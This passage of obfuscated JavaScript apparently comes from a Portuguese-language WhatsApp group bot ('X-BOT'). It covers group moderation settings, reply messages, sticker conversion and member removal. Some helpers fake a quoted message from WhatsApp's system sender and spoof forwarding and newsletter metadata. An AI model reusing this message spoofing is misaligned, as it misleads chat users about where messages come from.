          const _0x399715 = _0xd20756 ? _0x3bd584[0].antictt : undefined;
          const _0x51863c = _0xd20756 ? _0x3bd584[0].antiloc : undefined;
          const _0x44ddae = _0xd20756 ? _0x3bd584[0].antilinkgp : undefined;
          const _0x24bf3d = _0xd20756 ? _0x3bd584[0].antirequest : undefined;
          const _0x2cc1b9 = _0xd20756 ? antiporn.includes(_0x4f1071) : true;
          const _0x101fdd = _0xd20756 ? modopuxas.includes(_0x4f1071) : true || _0x2a5ff3;
          const _0x2002ae = !JSON.stringify(modoaluguelpix).includes(_0x4f1071) || modoaluguelpix[modoaluguelpix.map(_0x477dbe => _0x477dbe.id).indexOf(_0x4f1071)].aluga == true || _0x2a5ff3;
          const _0x51b3b7 = _0xd20756 ? _0x3bd584[0].antilinkhard : undefined;
          const _0x1a630f = _0xd20756 ? _0x3bd584[0].antifake : undefined;
          const _0x326231 = nescessario.Odelete;
          const _0x1dffcb = _0xd20756 ? _0x3bd584[0].soadm : undefined;
          const _0x1d56ff = _0xd20756 ? _0x3bd584[0].visuUnica : undefined;
          const _0x3fb600 = _0xd20756 ? _0x3bd584[0].sistemGold : undefined;
          const _0x31fb03 = _0xd20756 ? _0x3bd584[0].advertir : undefined;
          const _0x4e0062 = _0xd20756 ? _0x3bd584[0].advertir2 : undefined;
          const _0xec937a = _0xd20756 ? _0x3bd584[0].x9 : undefined;
          const _0x5efc71 = _0xd20756 ? _0x3bd584[0].multiprefix : undefined;
          const _0x4994fc = _0xd20756 ? _0x3bd584[0].antinotas : undefined;
          const _0x169982 = _0xd20756 ? _0x3bd584[0].anticatalogo : undefined;
          const _0x1146e6 = _0xd20756 ? _0x3bd584[0].wellcome[0].bemvindo1 : undefined;
          const _0x57d1c4 = _0xd20756 ? _0x3bd584[0].wellcome[1].bemvindo2 : undefined;
          const _0x12f03b = _0xd20756 ? _0x3bd584[0].simi1 : undefined;
          const _0x452d71 = _0xd20756 ? _0x3bd584[0].simi2 : undefined;
          const _0x47a927 = _0xd20756 ? _0x3bd584[0].autosticker : undefined;
          const _0x193ccd = _0xd20756 ? _0x3bd584[0].autoresposta : undefined;
          const _0x4df73d = _0xd20756 ? _0x3bd584[0].AdmSemprefixo : undefined;
          const _0x48c5d7 = _0xd20756 ? _0x3bd584[0].autotext : undefined;
          const _0x340531 = _0xd20756 ? _0x3bd584[0].autobaixar : undefined;
          const _0x23cd8e = _0xd20756 ? _0x3bd584[0].jogos : undefined;
          const _0x2ca1df = _0xd20756 ? _0x3bd584[0].level : undefined;
          const _0x1f8421 = _0xd20756 ? _0x3bd584[0].bangp : undefined;
          const _0x4c8b57 = _0xd20756 ? _0x3bd584[0].nsfw : undefined || _0x38b1b5;
          const _0x3c37ec = _0xd20756 ? _0x3bd584[0].antipalavrao.active : undefined;
          const _0x261170 = _0xd20756 ? _0x3bd584[0].antipalavrao.palavras : undefined;
          const _0x74ce95 = _0xd20756 ? _0x3bd584[0].limitec.active : undefined;
          const _0x589394 = !JSON.stringify(autorpg).includes(_0x4f1071) || autorpg[autorpg.map(_0x2d2bfa => _0x2d2bfa.id).indexOf(_0x4f1071)].rpg == true;
          const _0x1466ec = _0xd20756 ? _0x3bd584[0].limitec.quantidade : undefined;
          const _0x2f5db2 = _0xd20756 ? _0x3bd584[0].aluguel : undefined;
          const _0x368bcf = {
            espere: "" + _0x178e38,
            successo: "️❬ ✔ ❭ Sucesso 🖤",
            levelon: "❬ ✔ ❭ *leveling* *ativado*",
            leveloff: "❬ X ❭  *leveling* *desativado*",
            levelnoton: "❬ X ❭ *leveling não ativado*",
            levelnol: "*error* 0 °-°",
            error: {},
            msg: {}
          };
          _0x368bcf.error.stick = "*falhou, tente novamente ^_^*";
          _0x368bcf.error.Iv = "Link invalido ☹️";
          _0x368bcf.msg.grupo = "[❗] Este comando só pode ser usado em grupos! ❌";
          _0x368bcf.msg.premium = "[❗] ESTE PEDIDO É SO PARA *USUÁRIOS PREMIUMS*\n𝘈𝘋𝘘𝘜𝘐𝘙𝘈 𝘌𝘔 " + _0x1d93be + "lojavip";
          _0x368bcf.msg.mod = "[❗] ESTE PEDIDO É ESPECÍFICO PARA USUARIO MOD " + NickDono + "*";
          _0x368bcf.msg.banido = "❌ Você foi banido de utilizar os comandos, entre em contato com o proprietário pra saber o porque ❌";
          _0x368bcf.msg.donosmt = "[❗] Este é um recurso especial para o proprietário ❌";
          _0x368bcf.msg.donosmt2 = "[❗] Este é um recurso especial para o proprietário ❌";
          _0x368bcf.msg.adm = "[❗] Este comando só pode ser usado por administradores de grupo! ❌";
          _0x368bcf.msg.Badmin = " [❗] Este comando só pode ser usado quando o bot se torna administrador! ❌";
          enviar = _0x368bcf;
          var _0x270bdf = "Este comando só deve ser utilizado em Grupos.";
          var _0x7e2f25 = "Este comando é apenas para o meu dono utilizar...";
          var _0x5c594c = "Só Administradores do grupo podem utilizar este comando..";
          var _0x4c16a9 = "O Bot precisa ser Administrador do grupo para utilizar este comando...";
          var _0x4d2470 = "Este comando so pode ser utilizado com o comando " + _0x1d93be + "modobrincadeira 1 ativado, para desativar só basta utilizar " + _0x1d93be + "modobrincadeira 0";
          var _0x8ae4ee = "Este comando so pode ser utilizado com o comando " + _0x1d93be + "modopuxadas 1 ativado, para desativar só basta utilizar " + _0x1d93be + "modopuxadas 0";
          var _0x435246 = "[❗] Esse comando so pode ser utilizado com o modo " + _0x1d93be + "autorepo ativo\nDigite: " + _0x1d93be + "autorepo 1";
          if (_0x167068) {
            const _0x54703d = {
              fromMe: false,
              participant: "0@s.whatsapp.net",
              ...(_0x4f1071 ? {
                remoteJid: "status@broadcast"
              } : {})
            };
            const _0x35223f = {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: "" + NomeDoBot
            };
            const _0x9d5dd2 = {
              imageMessage: _0x35223f
            };
            const _0x59d42f = {
              key: _0x54703d,
              message: _0x9d5dd2
            };
            var _0xa6b34 = _0x59d42f;
          } else {
            var _0xa6b34 = _0x302296;
          }
          const _0x5d6558 = _0x302296.message?.extendedTextMessage?.contextInfo?.participant;
          const _0x25b5fb = _0x40e45c?.join(" ").replace("@", "") + "@s.whatsapp.net";
          const _0x5b0a24 = _0x302296.message?.extendedTextMessage?.contextInfo?.mentionedJid;
          const _0x416d5d = _0x1d6557.includes("@") ? _0x25b5fb : _0x32e455;
          const _0x415e57 = _0x1d6557.length > 6 && !_0x1d6557.includes("@") ? _0x1d6557.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x5d6558;
          const _0x1dcf0a = _0x1d6557.includes("@") ? _0x25b5fb : _0x5d6558;
          const _0xbe84ac = _0x1d6557.includes("@") ? _0x25b5fb : _0x1d6557.length > 6 && !_0x1d6557.includes("@") ? _0x1d6557.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x5d6558;
          const _0x346ed7 = _0x1d6557.length > 12 ? _0x1d6557.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net" : _0x5d6558;
          const _0x1af54c = JSON.parse(fs.readFileSync("./DADOS/usuarios/pushnames.json"));
          const _0x55a6ac = JSON.stringify(_0x1af54c).includes(_0x32e455) ? _0x1af54c[_0x1af54c.map(_0x3d43fc => _0x3d43fc.id).indexOf(_0x32e455)].nick : _0xd98cb9;
          const _0x386cd9 = _0x5c68b4 => {
            txt = JSON.stringify(_0x1af54c).includes(_0x5c68b4) ? _0x1af54c[_0x1af54c.map(_0x37b989 => _0x37b989.id).indexOf(_0x5c68b4)].nick : "Usuário";
            return txt;
          };
          const _0x2e2cfc = _0x27033e.includes(_0x1dcf0a) || _0xc5313b.includes(_0x1dcf0a);
          const _0x438d58 = "./DADOS/usuarios/termos.json";
          let _0x2c9a79 = [];
          try {
            if (fs.existsSync(_0x438d58)) {
              _0x2c9a79 = JSON.parse(fs.readFileSync(_0x438d58));
            } else {
              fs.writeFileSync(_0x438d58, JSON.stringify([]));
            }
          } catch (_0x339f80) {
            console.error("Hum achei um pequeno erro... fale com o Jeff:", _0x339f80);
          }
          const _0x27b8b3 = _0x2c9a79.includes(_0x32e455);
          const _0x50c980 = _0x44a98e.includes(_0x1dcf0a);
          const _0x5a6ff4 = _0x4af3e4 => {
            if (_0x4af3e4.includes("@")) {
              return txt.split("@")[1].replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
            } else {
              return _0x4af3e4.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
            }
          };
          const _0x256180 = _0x9044f5 => {
            return _0x9044f5.replace("#p#", _0x1d93be).replace("#p#", _0x1d93be).replace("#pc#", _0x1d93be + _0x3dec88).replace("#pc#", _0x1d93be + _0x3dec88);
          };
          var _0x4eac7e = _0x356071 => {
            if (linkfy.find(_0x356071)[0]) {
              return true;
            }
            return false;
          };
          const _0x403602 = _0x5978e7 => {
            const _0x4ed05a = {
              text: _0x5978e7
            };
            const _0x53b562 = {
              quoted: _0x302296
            };
            _0x263319.sendMessage(_0x4f1071, _0x4ed05a, _0x53b562).catch(_0xc80392 => {
              return _0x403602("" + infoerror);
            });
          };
          const _0x2b9a87 = _0x126831 => {
            const _0x210ffe = {
              forwardingScore: 508,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363193927649951@newsletter",
                serverMessageId: 100,
                newsletterName: "📣 X-BOT UPDATES & NOVIDADES 🔄"
              }
            };
            const _0x232fc1 = {
              text: _0x126831,
              contextInfo: _0x210ffe,
              mentions: [_0x1dcf0a],
              mentions: [_0x32e455]
            };
            _0x263319.sendMessage(_0x4f1071, _0x232fc1);
          };
          const _0x2ebd58 = moment.tz().tz("America/Sao_Paulo").format("HH:mm:ss");
          if (_0x2ebd58 > "00:00:00" && _0x2ebd58 < "05:00:00") {
            var _0x6965b0 = "𝗕𝗼𝗮 𝗺𝗮𝗱𝗿𝘂𝗴𝗮𝗱𝗮";
          }
          if (_0x2ebd58 > "05:00:00" && _0x2ebd58 < "12:00:00") {
            var _0x6965b0 = "𝗕𝗼𝗺 𝗱𝗶𝗮";
          }
          if (_0x2ebd58 > "12:00:00" && _0x2ebd58 < "18:00:00") {
            var _0x6965b0 = "𝗕𝗼𝗮 𝘁𝗮𝗿𝗱𝗲";
          }
          if (_0x2ebd58 > "18:00:00") {
            var _0x6965b0 = "𝗕𝗼𝗮 𝗻𝗼𝗶𝘁𝗲";
          }
          var _0x500000 = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
          const _0x12dacb = (_0x528904, _0x37259b, _0x54b00c) => {
            const _0x2e8ad2 = {
              url: fileName
            };
            const _0x23b167 = {
              sticker: _0x2e8ad2
            };
            const _0x3e4bce = {
              quoted: _0x54b00c
            };
            _0x263319.sendMessage(_0x528904, _0x23b167, _0x3e4bce);
          };
          const _0x5075d9 = _0x1adb57 => {
            const _0x56a737 = {
              url: _0x1adb57
            };
            const _0x5d9ef7 = {
              image: _0x56a737
            };
            const _0x12928e = {
              quoted: _0x302296
            };
            _0x263319.sendMessage(_0x4f1071, _0x5d9ef7, _0x12928e);
          };
          const _0x56cb1a = (_0x65312e, _0x9cc816) => {
            const _0x1daf12 = {
              text: _0x9cc816
            };
            _0x263319.sendMessage(_0x65312e, _0x1daf12);
          };
          const _0xd7aa55 = (_0x40445a, _0x16c898, _0x5852de) => {
            if (_0x5852de == null || _0x5852de == undefined || _0x5852de == false) {
              _0x263319.sendMessage(_0x4f1071, {
                text: _0x40445a.trim(),
                mentions: _0x16c898
              });
            } else {
              _0x263319.sendMessage(_0x4f1071, {
                text: _0x40445a.trim(),
                mentions: _0x16c898
              });
            }
          };
          const _0x5b6fe5 = (_0x170119 = "", _0x51e780 = _0x302296) => {
            memberr = [];
            vy = _0x170119.includes("\n") ? _0x170119.split("\n") : [_0x170119];
            for (vz of vy) {
              for (zn of vz.split(" ")) {
                if (zn.includes("@")) {
                  memberr.push(parseInt(zn.split("@")[1]) + "@s.whatsapp.net");
                }
              }
            }
            const _0x10e870 = {
              quoted: _0x51e780
            };
            _0x263319.sendMessage(_0x4f1071, {
              text: _0x170119.trim(),
              mentions: memberr
            }, _0x10e870);
          };
          const _0x50a2b8 = (_0x4a808e = "", _0x4fc624, _0x1abf24) => {
            memberr = [];
            vy = _0x4a808e.includes("\n") ? _0x4a808e.split("\n") : [_0x4a808e];
            for (vz of vy) {
              for (zn of vz.split(" ")) {
                if (zn.includes("@")) {
                  memberr.push(parseInt(zn.split("@")[1]) + "@s.whatsapp.net");
                }
              }
            }
            const _0x4632c4 = {
              url: _0x4fc624
            };
            const _0x201443 = {
              quoted: _0x1abf24
            };
            _0x263319.sendMessage(_0x4f1071, {
              image: _0x4632c4,
              caption: _0x4a808e.trim(),
              mentions: memberr
            }, _0x201443);
          };
          const _0x1b86ad = async (_0x535b66, _0xbd3b2f) => {
            const _0x10b898 = {
              text: _0xbd3b2f,
              key: _0x302296.key
            };
            const _0x5ce1f5 = {
              react: _0x10b898
            };
            var _0x518e41 = _0x5ce1f5;
            _0x263319.sendMessage(_0x535b66, _0x518e41);
          };
          const _0x1007a2 = async _0x976b91 => {
            const [_0x209714] = await _0x263319.onWhatsApp(_0x976b91);
            if (_0x209714 == undefined) {
              _0x403602("Este usuário não é existente no WhatsApp");
            } else {
              _0x403602("-> " + _0x976b91 + " Número inserido é existente no WhatsApp.\n\ncom o id: " + _0x209714.jid);
            }
          };
          var _0x3971c0 = async (_0x3049fc, _0x444b16, _0x1848f3, _0x5972da, _0x28c846, _0x840829, _0x2a8526) => {
            var _0x19206f = _0x840829;
            const _0x26d345 = {
              text: _0x444b16,
              footer: _0x1848f3,
              title: _0x5972da,
              buttonText: _0x28c846,
              sections: _0x19206f
            };
            var _0x1b00e7 = _0x26d345;
            const _0x543cf2 = {
              quoted: _0x2a8526
            };
            _0x263319.sendMessage(_0x3049fc, _0x1b00e7, _0x543cf2);
          };
          const _0x26c9b5 = async (_0x2ff533, _0x766f52, _0x55880e, _0x43fbc9, _0x41966b, _0x589df8, _0x5f53f5) => {
            const _0x2558f0 = {
              title: _0x589df8,
              rows: _0x5f53f5
            };
            const _0x4a044d = {
              text: _0x766f52,
              footer: _0x55880e,
              title: _0x43fbc9,
              buttonText: _0x41966b,
              sections: [_0x2558f0]
            };
            _0x5352b8 = _0x4a044d;
            _0x263319.sendMessage(_0x2ff533, _0x5352b8).catch(_0x523c47 => {
              console.log(_0x523c47);
            });
          };
          if (_0xd20756 && _0x5550bd && !_0x150e9e && !_0x35021e && !_0x2a5ff3) {
            if (_0x5b0a24?.length >= _0x5b3ba6.length - 1) {
              _0x263319.sendMessage(_0x4f1071, {
                text: "Membro comum com mensagem de marcação de todos do grupo, por conta disso irei remover do grupo, qualquer coisa entre em contato com um administrador..."
              });
              if (_0x326231) {
                setTimeout(() => {
                  _0x263319.sendMessage(_0x4f1071, {
                    delete: {
                      remoteJid: _0x4f1071,
                      fromMe: false,
                      id: _0x302296.key.id,
                      participant: _0x32e455
                    }
                  });
                }, 500);
              }
              _0x263319.groupParticipantsUpdate(_0x4f1071, [_0x32e455], "remove");
            }
          }
          const _0x2f53f1 = async (_0x9e80f9, _0x29b287) => {
            const _0x2927c1 = {
              url: _0x9e80f9
            };
            const _0x11adaa = {
              sticker: _0x2927c1
            };
            const _0x493a9e = {
              quoted: _0x29b287
            };
            _0x263319.sendMessage(_0x4f1071, _0x11adaa, _0x493a9e);
          };
          if (_0x47a927 && _0xd20756 || !_0xd20756 && setting?.autofigu) {
            async function _0x5d1da7() {
              setTimeout(async () => {
                if (_0xf87dd3.includes(_0x1d93be + "sticker") || _0xf87dd3.includes(_0x1d93be + "s") || _0xf87dd3.includes(_0x1d93be + "stk") || _0xf87dd3.includes(_0x1d93be + "st") || _0xf87dd3.includes(_0x1d93be + "fsticker") || _0xf87dd3.includes(_0x1d93be + "f") || _0xf87dd3.includes(_0x1d93be + "fstiker")) {
                  return;
                }
                if (_0x51a818 == "imageMessage") {
                  var _0x2b4d37 = "🪀 ⇝ Grupo:\n" + _0x471350 + "\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                  var _0x1af434 = "🗣" + _0x55a6ac + "\n\n🤖" + NomeDoBot + "\n\n🧙‍" + NickDono;
                  owgi = await getFileBuffer(_0x302296.message.imageMessage, "image");
                  const _0x2c3fd3 = {
                    packname: _0x2b4d37,
                    author: _0x1af434
                  };
                  let _0x4fa88e = await sendImageAsSticker2(_0x263319, _0x4f1071, owgi, _0x302296, _0x2c3fd3);
                  DLT_FL(_0x4fa88e);
                }
                if (_0x51a818 == "videoMessage") {
                  if (_0x13c612 && _0x302296.message.videoMessage.seconds < 10) {
                    var _0x2b4d37 = "🪀 ⇝ Grupo:\n" + _0x471350 + "\n🔗 ⇝ Site: \nbit.ly/bots-whats";
                    var _0x1af434 = "🗣" + _0x55a6ac + "\n\n🤖" + NomeDoBot + "\n\n🧙‍" + NickDono;
                    owgi = await getFileBuffer(_0x302296.message.videoMessage, "video");
                    const _0x10fbf0 = {
                      packname: _0x2b4d37,
                      author: _0x1af434
                    };
                    let _0x106ff8 = await sendVideoAsSticker2(_0x263319, _0x4f1071, owgi, _0x302296, _0x10fbf0);
                    DLT_FL(_0x106ff8);
                  }
                }
              }, 1000);
            }
            _0x5d1da7().catch(_0x2a50fe => {
              console.log(_0x2a50fe);
            });
          }
          var _0x4a9b85 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "");
          if (_0xd20756 && fs.existsSync("./DADOS/afk/afk-@" + _0x4a9b85 + ".json")) {
            if (_0xf87dd3.indexOf("@" + _0x4a9b85) >= 0) {
              const _0x184cc2 = JSON.parse(fs.readFileSync("./DADOS/afk/afk-@" + _0x4a9b85 + ".json"));
              txt = "- Olá, o " + NickDono + " Está ausente.\n\n - Desde: " + _0x184cc2.Ausente_Desde + "\n\n- 😇 Mensagem de ausência : " + _0x184cc2.Motivo_Da_Ausência;
              const _0x2680e7 = {
                text: txt
              };
              const _0x2f48de = {
                quoted: _0x302296
              };
              _0x263319.sendMessage(_0x4f1071, _0x2680e7, _0x2f48de);
            }
          }
          if (_0xd20756 && _0x3bd584[0].ausentes?.length > 0 && _0x5b0a24?.length > 0 && JSON.stringify(_0x3bd584[0].ausentes).includes(_0x5b0a24)) {
            _0x5185f1 = [];
            for (_0xc3d45a of _0x5b0a24) {
              if (_0x2aa963.indexOf(String(_0xc3d45a)) != -1) {
                _0x5185f1.push(_0x2aa963.indexOf(String(_0xc3d45a)));
              }
            }
            if (_0x5185f1.length == 0) {
              return;
            }
            big = [];
            for (_0xc3d45a of _0x5185f1) {
              big.push(_0x2aa963[_0xc3d45a]);
            }
            blr = [];
            for (_0xc3d45a = 0; _0xc3d45a < big.length; _0xc3d45a++) {
              blr.push(_0x3bd584[0].ausentes[_0x3bd584[0].ausentes.map(_0x17b815 => _0x17b815.id).indexOf(big[_0xc3d45a])]);
            }
            for (_0xc3d45a of blr) {
              var _0x5c278a = _0xc3d45a;
            }
            _0x5b6fe5("\n╭─────────────\n┊ Registro de ausência.\n┊ \n┊ ADM: @" + _0x5c278a.id.split("@")[0] + "\n┊   \n╰────◉  ◊\n\n↺➤ Mensagem: " + _0x5c278a.msg + "\n\n ─────────────");
          }
          if (_0x5550bd && _0x150e9e && _0x2e320b === "apaga") {
            if (!_0x5d6558) {
              return;
            }
            _0x263319.sendMessage(_0x4f1071, {
              delete: {
                remoteJid: _0x4f1071,
                fromMe: false,
                id: _0x302296.message.extendedTextMessage.contextInfo.stanzaId,
                participant: _0x5d6558
              }
            });
          }
          if (!_0x38b1b5 && !_0x2a5ff3 && !_0x101fdd && _0x3dc931.includes(_0x3dec88)) {
            return _0x403602(enviar.msg.premium);
          }
          if (_0x2a5ff3 && _0xf87dd3.includes("reiniciar-xbot") || _0x302296.key.fromMe && _0xf87dd3.includes("reiniciar-xbot")) {
            fs.writeFileSync("./cnt-upd.json", JSON.stringify([], null, 2));
            setTimeout(() => {
              file = require.resolve("./iniciar.js");
              delete require.cache[file];
              require(file);
            }, 500);
            setTimeout(() => {
              DLT_FL("./cnt-upd.json");
            }, 1500);
          }
          if (_0xd20756 && _0x52ab25 && _0x2f5db2 && !_0x2a5ff3) {
            return _0x403602(mess.aluguelMessageActivated(_0x55a6ac));
          }
          if (!_0x38b1b5 && !_0x2a5ff3 && !_0x101fdd && _0x3dc931.includes(_0x3dec88)) {
            return _0x403602(enviar.msg.premium);
          }
          const _0x435e9e = moment.tz().tz("America/Sao_Paulo").format("HH:mm:ss");
          if (_0x435e9e > "00:00:00" && _0x435e9e < "05:00:00") {
            var _0x2a56d2 = "Boa madrugada";
          }
          if (_0x435e9e > "05:00:00" && _0x435e9e < "12:00:00") {
            var _0x2a56d2 = "Bom dia";
          }
          if (_0x435e9e > "12:00:00" && _0x435e9e < "18:00:00") {
            var _0x2a56d2 = "Boa tarde";
          }
          if (_0x435e9e > "18:00:00") {
            var _0x2a56d2 = "Boa noite";
          }
          var _0x3fa54a = ["Ola sou o Jeff IA estou aqui para realizar ações ou responder a sua pergunta ou dúvida posso ajudar?", "Ola me chamo Jeff IA como posso te ajudat hoje?", "Olá! Me chamo Jeff, Como posso ajudar você hoje?", "Olá! Como posso ajudar você hoje?", "Olá " + _0x2a56d2 + " Como posso ajudar você hoje?", "🧙‍♂️Olá! " + _0x2a56d2 + " Como posso ajudar você hoje?"];
          var _0x56dc92 = _0x3fa54a[Math.floor(Math.random() * _0x3fa54a.length)];
          if (_0xd20756 && _0x52ab25 && _0x1f8421 && !_0x2a5ff3) {
            return;
          }
          if (_0xd20756 && _0x52ab25 && _0x1dffcb && !_0x2a5ff3 && !_0x150e9e && !_0x35021e) {
            return;
          }
          if (_0xf63551 && !_0x2a5ff3) {
            return;
          }
          const _0x57b206 = !_0x2a5ff3 ? "Membro" : "Dono";
          const _0x5b87bd = async (_0x27be0e, _0x21ff82) => {
            try {
              var _0x5697a8 = Date.now() / 10000;
              function _0x2ef2e4(_0x52c7ec, _0x1f5225, _0x1352a7) {
                request.head(_0x52c7ec, function (_0xf5f3ef, _0x8b8e7a, _0x586147) {
                  request(_0x52c7ec).pipe(fs.createWriteStream(_0x1f5225)).on("close", _0x1352a7);
                });
              }
              _0x2ef2e4(_0x21ff82, "./sticker" + _0x5697a8 + ".png", async function () {
                console.log("enviando sticker");
                let _0x32a9c5 = "./sticker" + _0x5697a8 + ".png";
                let _0x3faa61 = "./sticker" + _0x5697a8 + ".webp";
                exec("ffmpeg -i " + _0x32a9c5 + " -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 " + _0x3faa61, _0x5ececa => {
                  let _0x4c2680 = fs.readFileSync(_0x3faa61);
                  const _0x636908 = {
                    sticker: _0x4c2680
                  };
                  const _0x2a087c = {
                    forwardingScore: 50,
                    isForwarded: true
                  };
                  const _0xa4caae = {
                    sendEphemeral: true,
                    contextInfo: _0x2a087c,
                    quoted: _0x302296
                  };
                  _0x263319.sendMessage(_0x27be0e, _0x636908, _0xa4caae).catch(_0x43f11d => {
                    return _0x403602("" + infoerror);
                  });
                  DLT_FL(_0x32a9c5);
                  DLT_FL(_0x3faa61);
                });
              });
            } catch {
              return _0x403602("Erro.. FNC");
            }
          };
          const _0x3ccbec = _0x51a818 == "imageMessage";
          const _0x1f961c = _0x51a818 == "videoMessage";
          const _0x1fe0d6 = _0x51a818 == "viewOnceMessageV2";
          const _0x5e5a8a = _0x51a818 == "audioMessage";
          const _0x210530 = _0x51a818 == "stickerMessage";
          const _0x3646e1 = _0x51a818 == "contactMessage";
          const _0x19f6ca = _0x51a818 == "locationMessage";
          const _0x1611b8 = _0x51a818 == "productMessage";
          const _0x13c612 = _0x51a818 === "imageMessage" || _0x51a818 === "videoMessage" || _0x51a818 === "audioMessage" || _0x51a818 == "viewOnceMessage" || _0x51a818 == "viewOnceMessageV2";
          typeMessage = _0x2e320b.substr(0, 50).replace(/\n/g, "");
          if (_0x3ccbec) {
            typeMessage = "Image";
          } else if (_0x1f961c) {
            typeMessage = "Video";
          } else if (_0x5e5a8a) {
            typeMessage = "Audio";
          } else if (_0x210530) {
            typeMessage = "Sticker";
          } else if (_0x3646e1) {
            typeMessage = "Contact";
          } else if (_0x19f6ca) {
            typeMessage = "Location";
          } else if (_0x1611b8) {
            typeMessage = "Product";
          }
          const _0x368a3f = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("conversation");
          const _0x57848 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("text");
          const _0x10f925 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("imageMessage");
          const _0x346bc2 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("viewOnceMessage");
          const _0x330150 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("viewOnceMessageV2");
          const _0x5760e9 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("videoMessage");
          const _0x11898e = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("documentMessage");
          const _0x434b84 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("documentWithCaptionMessage");
          const _0x6aebb1 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("audioMessage");
          const _0x1785a1 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("stickerMessage");
          const _0x44f302 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("contactMessage");
          const _0x385e3e = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("locationMessage");
          const _0x4c21a0 = _0x51a818 === "extendedTextMessage" && _0x183b6c.includes("productMessage");
          if (_0xd20756) {
            const _0x3ce894 = getComandos(_0x4f1071);
            if (_0x3ce894 === undefined) {
              addComandosId(_0x4f1071);
            }
          }
          if (_0xd20756 && _0x52ab25 && !_0x2a5ff3 && !_0x35021e && getComandoBlock(_0x4f1071).includes(_0x3dec88)) {
            return _0x403602("comando blockeado");
          }
          const {
            AdicionarSaldo: _0x2df0e8,
            AdicionarUser: _0x319305,
            VerSaldo: _0x5e0fc1,
            ConfirmarPagamento: _0x149098
          } = require("./armor/js/dinheiro.js");
          const _0x354331 = async (_0x5dd600, _0x54991f, _0x9264af, _0x2c20ef, _0x4f684a, _0x38f3a0) => {
            let _0xeea910 = [_0x54991f, _0x9264af, _0x2c20ef, _0x4f684a, _0x38f3a0];
            for (let _0x4dd63f of _0xeea910) {
              if (_0x4dd63f == undefined) {
                return;
              }
              if (_0xf87dd3.match(new RegExp(_0x4dd63f, "i"))) {
                const _0x3373d3 = {
                  url: _0x5dd600
                };
                const _0x3c3937 = {
                  audio: _0x3373d3,
                  mimetype: "audio/mp4",
                  ptt: true
                };
                const _0x1bc8d9 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x3c3937, _0x1bc8d9);
                break;
              }
            }
          };
          const _0x576ebe = async (_0x3b0ca4, _0xba74e8, _0x42e9ab, _0x54052b, _0x2c087f, _0x132b7a) => {
            const _0x50c8dd = [_0xba74e8, _0x42e9ab, _0x54052b, _0x2c087f, _0x132b7a];
            for (let _0x17b4ef of _0x50c8dd) {
              if (_0x17b4ef === undefined) {
                return;
              }
              if (_0x3381b5.includes(_0x17b4ef)) {
                const _0x33e73c = {
                  url: _0x3b0ca4
                };
                const _0x2fe372 = {
                  sticker: _0x33e73c
                };
                const _0x5da504 = {
                  quoted: _0x302296
                };
                await _0x263319.sendMessage(_0x4f1071, _0x2fe372, _0x5da504);
              }
            }
          };
          const _0x2bac06 = _0x5e0fc1(_0x32e455);
          try {
            if (_0x2bac06 === undefined) {
              _0x319305(_0x32e455);
            }
            valor = 0;
            _0x2df0e8(_0x32e455, valor);
          } catch (_0x24c87b) {
            console.error(_0x24c87b);
          }
          function _0x1916ad(_0x21af1d, _0x3fcc0d) {
            const _0x59b30c = _0x21af1d.length;
            const _0x33b858 = _0x3fcc0d.length;
            const _0x4fa1d0 = Array.from(Array(_0x59b30c + 1), () => Array(_0x33b858 + 1).fill(0));
            for (let _0x713012 = 0; _0x713012 <= _0x59b30c; _0x713012++) {
              _0x4fa1d0[_0x713012][0] = _0x713012;
            }
            for (let _0x5a38bd = 0; _0x5a38bd <= _0x33b858; _0x5a38bd++) {
              _0x4fa1d0[0][_0x5a38bd] = _0x5a38bd;
            }
            for (let _0x24a442 = 1; _0x24a442 <= _0x33b858; _0x24a442++) {
              for (let _0x2d3026 = 1; _0x2d3026 <= _0x59b30c; _0x2d3026++) {
                if (_0x21af1d[_0x2d3026 - 1] === _0x3fcc0d[_0x24a442 - 1]) {
                  _0x4fa1d0[_0x2d3026][_0x24a442] = _0x4fa1d0[_0x2d3026 - 1][_0x24a442 - 1];
                } else {
                  _0x4fa1d0[_0x2d3026][_0x24a442] = Math.min(_0x4fa1d0[_0x2d3026 - 1][_0x24a442] + 1, _0x4fa1d0[_0x2d3026][_0x24a442 - 1] + 1, _0x4fa1d0[_0x2d3026 - 1][_0x24a442 - 1] + 1);
                }
              }
            }
            return _0x4fa1d0[_0x59b30c][_0x33b858];
          }
          function _0x2dae7a(_0x221497, _0x3b9b8d) {
            _0x221497 = _0x221497.trim().toLowerCase();
            _0x3b9b8d = _0x3b9b8d.trim().toLowerCase();
            const _0x223cc9 = _0x221497.length < _0x3b9b8d.length ? _0x221497 : _0x3b9b8d;
            const _0x2f3b7f = _0x221497.length < _0x3b9b8d.length ? _0x3b9b8d : _0x221497;
            let _0x2c585 = 0;
            let _0x19dafa = 0;
            let _0x41afe9 = 0;
            while (_0x2c585 < _0x223cc9.length && _0x19dafa < _0x2f3b7f.length) {
              if (_0x223cc9[_0x2c585] === _0x2f3b7f[_0x19dafa]) {
